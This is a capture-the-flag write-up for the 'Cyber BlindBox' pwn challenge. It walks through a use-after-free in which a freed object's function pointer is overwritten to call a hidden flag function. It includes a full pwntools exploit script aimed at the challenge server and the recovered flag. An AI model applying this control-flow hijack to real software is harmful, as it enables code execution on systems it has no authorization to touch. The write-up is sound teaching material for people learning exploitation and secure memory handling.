---
slug: "local-ctf/umcs-preliminary/binary-cyber-blindbox"
event: "umcs-preliminary"
title: "Cyber BlindBox"
summary: "UMCS Preliminary umcs preliminary, forensics, reverse engineering writeup covering Cyber BlindBox with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - forensics
  - reverse-engineering
  - binary-exploitation
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** Cyber BlindBox
**Category:** Pwn
**Points:** 450
**Flag Format:** `UMCS{...}`
**Remote Service:** `nc chal.umcybersec.site 10480`
**Provided File:** `blindbox`, a Linux ELF binary

The challenge presents a menu-based “Cyber BlindBox Simulator” where users can draw boxes, discard boxes, write reviews, and view their shelf. The goal is to abuse a memory corruption bug to call a hidden function left by the developers.

The challenge hints were highly relevant:

```text
Discarding a box doesn't wipe its existence from your shelf. (UAF)

Can you write a review that overwrites the print_desc function pointer
to call the hidden secret_grant function?
```

The objective is therefore to exploit a **Use-After-Free** vulnerability and redirect execution to the hidden `secret_grant()` function.

# Initial Analysis

First, identify the binary:

```bash
file blindbox
```

Expected result:

```text
blindbox: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

Checking protections:

```bash
checksec --file=blindbox
```

Observed properties:

```text
Arch:     amd64
NX:       Enabled
Canary:   Present
PIE:      Disabled
RELRO:    Partial
Stripped: Yes
```

The most important detail is:

```text
PIE: Disabled
```

Because PIE is disabled, code addresses are static. This means if we find the hidden function address locally, the same address can be used remotely.

The binary exposes this menu:

```text
=== Cyber BlindBox Simulator (144 Combinations) ===

1. Draw Box
2. Discard Box
3. Write Review
4. View Shelf
>
```

From reversing the binary, the hidden function responsible for printing the flag was found at:

```text
0x4012b6
```

This function eventually executes logic equivalent to:

```c
system("cat flag.txt");
```

So the exploitation goal is:

```text
Redirect execution to 0x4012b6
```

# Vulnerability / Weakness Identification

The vulnerability is a classic **Use-After-Free**.

The program allows the user to store heap-allocated blind boxes on a shelf. Each box contains a function pointer used when viewing the shelf.

Conceptually, the object looks like this:

```c
struct Box {
    void (*print_desc)(struct Box *box);
    char review[...];
    int prefix_id;
    int item_id;
};
```

When the user selects **View Shelf**, the program calls the function pointer:

```c
box->print_desc(box);
```

The vulnerable behavior happens in the discard functionality.

A safe implementation should do something like this:

```c
free(shelf[index]);
shelf[index] = NULL;
```

However, the challenge only frees the object and leaves the pointer inside the shelf:

```c
free(shelf[index]);
```

The pointer remains accessible after being freed.

That means the program still allows operations on a freed heap chunk:

```text
Draw Box      -> allocate object
Discard Box   -> free object, but shelf[index] still points to it
Write Review  -> write data into freed object
View Shelf    -> call function pointer from freed object
```

This creates a direct control-flow hijack.

Because the object contains a function pointer, overwriting that pointer with the address of the hidden function causes the program to call the flag function.

# Exploitation Strategy

The attack plan is simple and reliable:

1. Draw one blind box.

2. The object is stored at shelf slot `0`.

3. Discard slot `0`.

4. The heap object is freed, but `shelf[0]` still points to it.

5. Use **Write Review** on slot `0`.

6. Because of the UAF, the program writes into the freed object.

7. Overwrite the object’s `print_desc` function pointer with the hidden function address.

8. Select **View Shelf**.

9. The program calls:


```c
shelf[0]->print_desc(shelf[0]);
```

But now `print_desc` points to:

```text
0x4012b6
```

So execution jumps to the hidden function and prints the flag.

The target address must be packed in little-endian format:

```python
p64(0x4012b6)
```

This becomes:

```text
b6 12 40 00 00 00 00 00
```

# Proof of Concept

A manual interaction would look like this:

```text
1. Draw Box
2. Discard Box
3. Write Review
4. View Shelf
```

The actual exploit sequence is:

```text
1
2
0
3
0
<address of secret_grant>
4
```

Using Python, the critical payload is:

```python
payload = p64(0x4012b6)
```

When sent as the review content for the freed slot, it overwrites the function pointer.

In the successful run, the exploit sent this value:

```text
b6 12 40 00 00 00 00 00
```

That is the little-endian representation of:

```text
0x4012b6
```

After choosing **View Shelf**, the service printed the flag successfully.

# Full Python Solver

Save this as `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *

# ============================================================
# Cyber BlindBox Solver
# Vulnerability: Use-After-Free
# Goal: Overwrite print_desc function pointer with secret_grant
# ============================================================

HOST = "chal.umcybersec.site"
PORT = 10480

# Hidden function address found from static reversing.
# PIE is disabled, so this address is stable remotely.
SECRET_GRANT = 0x4012b6

context.arch = "amd64"
context.log_level = "info"


def start():
    """
    Connect to the remote challenge service.
    """
    return remote(HOST, PORT)


def draw_box(p):
    """
    Menu option 1: allocate a new BlindBox object.
    """
    p.sendlineafter(b"> ", b"1")


def discard_box(p, slot):
    """
    Menu option 2: free a BlindBox object.

    Vulnerability:
    The program frees the object but does not clear the shelf pointer.
    This leaves a dangling pointer behind.
    """
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Slot to discard: ", str(slot).encode())


def write_review(p, slot, data):
    """
    Menu option 3: write data into a box.

    Because the pointer remains after free, this can write into a freed object.
    We use this to overwrite the function pointer.
    """
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Slot to review: ", str(slot).encode())
    p.sendafter(b"Review content: ", data)


def view_shelf(p):
    """
    Menu option 4: trigger the function pointer call.

    After the overwrite, this calls secret_grant().
    """
    p.sendlineafter(b"> ", b"4")


def main():
    p = start()

    log.info("Drawing a box into slot 0")
    draw_box(p)

    log.info("Discarding slot 0 to create a dangling pointer")
    discard_box(p, 0)

    log.info(f"Overwriting function pointer with secret_grant: {hex(SECRET_GRANT)}")

    # Pack the address as a 64-bit little-endian value.
    payload = p64(SECRET_GRANT)

    # Write payload into the freed object through the dangling shelf pointer.
    write_review(p, 0, payload)

    log.info("Viewing shelf to trigger overwritten function pointer")
    view_shelf(p)

    # Hand control to the user so the flag output is visible.
    p.interactive()


if __name__ == "__main__":
    main()
```

# Walkthrough

Create and activate a Python virtual environment:

```bash
python3 -m venv venv
source venv/bin/activate
```

Install pwntools:

```bash
python3 -m pip install --upgrade pip
python3 -m pip install pwntools
```

Run the solver:

```bash
python3 solve.py
```

Expected output pattern:

```text
[+] Opening connection to chal.umcybersec.site on port 10480: Done
[*] Drawing a box into slot 0
[*] Discarding slot 0 to create a dangling pointer
[*] Overwriting function pointer with secret_grant: 0x4012b6
[*] Viewing shelf to trigger overwritten function pointer
[*] Switching to interactive mode
UMCS{...}
```

If pwntools is missing, the error will look like this:

```text
ModuleNotFoundError: No module named 'pwn'
```

Fix it with:

```bash
python3 -m pip install pwntools
```

If the virtual environment prompt looks strange because the directory contains spaces, that is usually harmless. The exploit can still run correctly as long as pwntools imports successfully.

You can verify pwntools with:

```bash
python3 -c "from pwn import *; print('pwntools works')"
```

# Flag

The exploit successfully redirected execution to the hidden function and recovered:

```text
UMCS{1df91269-73dd-473e-911a-a136ecbec2f7}
```

# Conclusion

The root cause of the challenge is improper heap object lifetime management.

The program frees a blind box object but does not remove its pointer from the shelf. This leaves a dangling pointer, allowing the user to write into freed memory through the **Write Review** feature. Since the freed object contains a function pointer, the attacker can overwrite that pointer with the address of the hidden `secret_grant()` function.

Because PIE is disabled, the hidden function address is static:

```text
0x4012b6
```

The final exploit is therefore a straightforward UAF control-flow hijack:

```text
free object
reuse dangling pointer
overwrite function pointer
trigger function call
print flag
```

The key lesson is that freeing memory is not enough. Any remaining references to freed memory must be cleared or invalidated. Otherwise, a Use-After-Free bug can become a direct code execution primitive.
